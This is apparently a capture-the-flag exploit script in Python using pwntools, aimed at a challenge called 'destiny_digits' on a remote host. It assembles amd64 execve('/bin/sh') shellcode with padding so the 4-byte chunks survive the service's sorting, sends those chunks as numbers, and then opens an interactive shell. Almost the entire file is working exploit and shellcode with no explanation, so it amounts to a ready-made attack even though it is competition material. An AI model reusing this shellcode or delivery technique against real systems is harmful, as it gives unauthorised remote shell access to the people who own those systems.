from pwn import *

context.arch = 'amd64'

print("Generate shellcode ...")

# Shellcode instructions
push_rdi = asm("push rdi")
push_rsp = asm("push rsp")
push_rdx = asm("push rdx")
pop_rdi = asm("pop rdi")
pop_rsi = asm("pop rsi")
pop_rax = asm("pop rax")
push_0x3b = asm("push 0x3b")
cltd = asm("cltd")
syscall = asm("syscall")
mov_rdi_binsh = asm("mov rdi, 0x68732f6e69622f")

# Padding instructions
nop = asm("nop")
assert nop[0] == 0x90
assert len(nop) == 1
add_bl_al = asm("add bl, al")
assert add_bl_al[0] == 0
assert len(add_bl_al) == 2
push_rax = asm("push rax")
assert push_rax[0] == 0x50
assert len(push_rax) == 1
push_rcx = asm("push rcx")
assert push_rcx[0] == 0x51
assert len(push_rcx) == 1

# A lot of manual fiddling to get the sort right:
# * Insert "padding" instructions (pseudo-nops) on 4-byte boundaries
# * Insert actual nops to shift instruction positions
shellcode = b''
shellcode += add_bl_al  # padding
shellcode += mov_rdi_binsh
shellcode += push_rax  # padding
shellcode += push_0x3b
shellcode += pop_rax
shellcode += push_rcx  # padding
shellcode += cltd
shellcode += push_rdi
shellcode += nop  # padding
shellcode += push_rsp
shellcode += pop_rdi
shellcode += push_rdx
shellcode += nop
shellcode += push_rdi
shellcode += push_rsp
shellcode += nop * 2
shellcode += pop_rsi
shellcode += syscall
shellcode += nop
print(hexdump(shellcode))
assert len(shellcode) % 4 == 0

sc = []
for i in range(0, len(shellcode), 4):
    sc.append(u32(shellcode[i:i+4]))

print("Sending shellcode ...")

# p = process('./destiny_digits')
# p = remote('127.0.0.1', 4444)
p = remote('flu.xxx', 10110)
p.recvuntil(b"What's your lucky number? ")
input('Attach a debugger? ')
for n in sc:
    p.sendline(str(n).encode())
    p.recvuntil(b'Got another one? ')

p.sendline(b'')

p.interactive()
